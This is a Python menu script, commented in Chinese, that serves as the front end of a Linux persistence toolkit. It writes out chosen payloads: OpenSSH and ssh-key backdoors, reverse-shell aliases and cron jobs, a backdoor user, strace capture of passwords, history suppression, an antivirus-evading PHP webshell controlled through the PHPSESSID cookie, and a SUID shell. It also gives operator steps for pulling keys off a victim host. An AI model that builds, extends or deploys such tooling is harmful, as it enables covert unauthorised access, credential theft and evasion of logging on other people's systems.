# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
from colorama import init
from termcolor import colored
import os
from tabulate import tabulate
import shutil

init()


def Dowfile(input_files, file_name):
    if not os.path.exists('payloads'):
        os.makedirs('payloads')
    with open(input_files, 'r', encoding='utf-8') as input_file, open('payloads/' + file_name, 'w+',
                                                                      encoding='utf-8') as output_file:
        # 读取输入文件的内容
        content = input_file.read()

        # 将内容写入输出文件
        output_file.write(content)
        print(f'生成成功,文件为：/payloads/{file_name}')


def chooses(name_data):
    i = 0
    print(name_data)
    data = [
        ['序号', "payload name", "payload"],
        ['1',
         f"{colored('OpenSSH后门', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['2',
         f"{colored('后门用户', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['3',
         f"{colored('Alias后门', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['4',
         f"{colored('crontab计划任务', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['5',
         f"{colored('ssh软链接后门', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['6',
         f"{colored('ssh公私密钥后门', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['7',
         f"{colored('Strace后门', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['8',
         f"{colored('Rootkit后门', 'yellow')}",
         f"{colored('no', 'yellow')}",
         ],
        ['9',
         f"{colored('不记录命令[history]', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['10',
         f"{colored('ssh软链接&crontab', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['11',
         f"{colored('sshkey密钥&crontab', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['12',
         f"{colored('php权限维持不死免杀马', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['13',
         f"{colored('check检查脚本', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
        ['14',
         f"{colored('Suid shell bash脚本(低权限用户运行)', 'cyan')}",
         f"{colored('yes', 'red')}",
         ],
    ]
    # 获取终端的宽度
    terminal_width, _ = shutil.get_terminal_size()
    # 使用"grid"格式，手动设置列对齐方式
    table = tabulate(data, tablefmt="grid")
    print(table)
    print(colored('[请输入payload序号, 一行一个, 输入exit退出 or ctrl+c]', 'green'))
    a = input(colored(f'[{i}]:', 'green'))
    while True:
        if a in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', 'exit']:
            i = i + 1
            if not a != 'exit':
                print(colored(f'\n------------------------------------------', 'red'),
                      '{', colored("程序退出", "green"), '}',
                      colored(f'------------------------------------------', 'red')
                      )
                break
            else:
                if a == str(1):
                    print('请修改生成完的文件，里面的记录明文的文件位置')
                    Dowfile('payload/1OpenSSH/sshOpenSSH.py', 'sshOpenSSH.py')
                    a = input(colored(f'[{i}]:', 'green'))  # 控制输入一个之后，还可用继续输入
                elif a == str(2):
                    print('请修改生成完的文件，里面的用户名和密码')
                    c = input('创不创home目录下用户文件夹[建议创建{创建位置指定/root目录}]：[1]不创建  [2]创建:')
                    if c == '1':
                        Dowfile('payload/2adduser/adduser.py', 'adduser.py')
                    elif c == '2':
                        Dowfile('payload/2adduser/adduser_new_user.py', 'adduser_new_user.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(3):
                    print('请修改生成完的文件，里面的反弹shell的ip以及port')
                    c = input('输入python版本[3 or 2]:')
                    if c == '3':
                        Dowfile('payload/3alerts/alerts.py', 'alerts.py')
                    elif c == '2':
                        Dowfile('payload/3alerts/alerts2.py', 'alerts2.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(4):
                    print('请修改生成完的文件，里面的反弹shell的ip以及port')
                    c = input('计划任务后门分为：[1]直接写入/etc/crontab文件中 or [2]直接使用crontab命令生成:')
                    if c == '1':
                        Dowfile('payload/4crontab/etc_Cron.py', 'etc_Cron.py')
                    elif c == '2':
                        Dowfile('payload/4crontab/Cron_n.py', 'Cron_n.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(5):
                    print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                    Dowfile('payload/5ssh_Soft_link/ssh_Soft_link.py', 'ssh_Soft_link.py')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(6):
                    c = input('ssh公私密钥后门分为：[1]在自己服务器生成 or [2]在目标机器生成:')
                    if c == '1':
                        print(
                            '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
                        Dowfile('payload/6sshkey/sshkey_local.py', 'sshkey_local.py')
                    elif c == '2':
                        print(
                            '生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 user@ip  如果连接报错，请输入chmod 600 .11'
                            '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
                        Dowfile('payload/6sshkey/sshkey_target.py', 'sshkey_target.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(7):
                    print('请修改生成完的文件，里面的记录明文的文件位置')
                    Dowfile('payload/7strace/sshd.py', 'sshd.py')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(8):
                    print('项目地址：https://github.com/f0rb1dd3n/Reptile/')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(9):
                    c = input('(1)所有用户都不记录命令{写入环境变量}，(2)当前用户不记录{同时可以选择批量删除某一行，重启失效}()：[1] or [2]:')
                    if c == '1':
                        Dowfile('payload/9HISTCONTROL/HISTCONTROL.py', 'HISTCONTROL.py')
                    elif c == '2':
                        print('记得修改需要删除的match数量')
                        Dowfile('payload/9HISTCONTROL/HISTCONTROLuser.py', 'HISTCONTROLuser.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(10):
                    c = input('计划任务&软链接后门：[1]使用/etc/文件维持 or [2]使用直接使用crontab命令维持:')
                    if c == '1':
                        print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                        Dowfile('payload/10ssh_Soft_link_cromtab/ssh_Soft_link_etc_Cron.py',
                                'ssh_Soft_link_etc_Cron.py')
                    elif c == '2':
                        print('请修改生成完的文件，里面的连接端口 [连接ssh user@ip -p port]')
                        Dowfile('payload/10ssh_Soft_link_cromtab/ssh_Soft_link_Cron_n.py', 'ssh_Soft_link_Cron_n.py')
                    else:
                        print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(11):
                    c = input('计划任务&ssk密钥后门：[1]使用/etc/文件维持 or [2]使用直接使用crontab命令维持:')
                    if c == '1':
                        c = input('ssh公私密钥后门分为：[1]在自己服务器生成 or [2]在目标机器生成:')
                        if c == '1':
                            print(
                                '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
                            Dowfile('payload/11crontab_key/etc_cron/ect_cron_ssh_local.py', 'ect_cron_ssh_local.py')
                        elif c == '2':
                            print(
                                '生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 user@ip  如果连接报错，请输入chmod 600 .11'
                                '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
                            Dowfile('payload/11crontab_key/etc_cron/ect_cron_ssh_target.py', 'ect_cron_ssh_target.py')
                        else:
                            print('输入错误')
                    elif c == '2':
                        c = input('ssh公私密钥后门分为：[1]在自己服务器生成 or [2]在目标机器生成:')
                        if c == '1':
                            print(
                                '生成之后，运行ssh-keygen -t ed25519 -N "admin!@#45123", -N为密码，注意需要把id_ed25519.pub，填入生成的文件id_ed25519_pub变量中,连接ssh -i id_ed25519 user@ip  如果连接报错，请输入chmod 600 id_ed25519')
                            Dowfile('payload/11crontab_key/cron/cron_ssh_local.py', 'cron_ssh_local.py')
                        elif c == '2':
                            print(
                                '生成之后，修改文件中的password密码,在目标机器运行之后，下载/tmp/.11 密钥文件，连接ssh -i .11 user@ip  如果连接报错，请输入chmod 600 .11'
                                '在对方服务器运行之后，下载/tmp/.11文件，这个文件就是密钥文件，下载之后可以删除，然后在连接')
                            Dowfile('payload/11crontab_key/etc_cron/cron_ssh_target.py', 'cron_ssh_target.py')
                        else:
                            print('输入错误')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(12):
                    print(
                        'php权限维持不死免杀马，修改file为文件位置，使用命令为： Cookie:PHPSESSID=706870696e666f28293b[phpinfo]，十六进制字符串')
                    Dowfile('payload/12phpwebshell/busu/bus.php', 'bus.php')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(13):
                    print('check检查脚本[检测对方服务器适合什么类型的权限维持模块]')
                    Dowfile('check/check.py', 'check.py')
                    a = input(colored(f'[{i}]:', 'green'))
                elif a == str(14):
                    print('Suid shell bash脚本[低权限用户运行]')
                    Dowfile('payload/13bashperm/13bashperm.py', '13bashperm.py')
                    a = input(colored(f'[{i}]:', 'green'))
                else:#check文件不在payload文件夹里面所以对不上
                    print('Null')
                    break
        else:
            print("输入无效，请重新输入！")
            a = input(colored(f'[{i}]:', 'green'))
